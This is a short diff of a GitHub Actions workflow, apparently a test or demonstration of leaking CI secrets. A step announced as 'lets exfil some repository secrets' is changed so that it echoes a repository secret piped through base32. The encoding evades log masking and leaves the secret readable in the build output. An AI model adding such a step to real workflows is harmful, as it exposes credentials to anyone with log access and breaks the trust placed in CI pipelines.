@@ -13,4 +13,4 @@ jobs:
       id: response
       run:  |
           echo "lets exfil some repository secrets..."
-          echo "${{secrets.TEST_RL}}"
+          echo "${{secrets.TEST_RL}}" | base32
